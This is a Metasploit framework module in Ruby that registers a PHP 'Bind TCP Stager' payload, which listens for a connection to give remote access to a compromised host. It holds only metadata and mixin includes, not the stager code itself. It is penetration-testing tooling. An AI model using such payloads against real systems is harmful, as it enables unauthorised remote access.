##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/core/payload/php/bind_tcp'

module Metasploit4

  CachedSize = 1183

  include Msf::Payload::Stager
  include Msf::Payload::Php::BindTcp

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Bind TCP Stager',
      'Description'   => 'Listen for a connection',
      'Author'        => ['egypt'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'php',
      'Arch'          => ARCH_PHP,
      'Handler'       => Msf::Handler::BindTcp,
      'Stager'        => { 'Payload' => "" }
      ))
  end

end
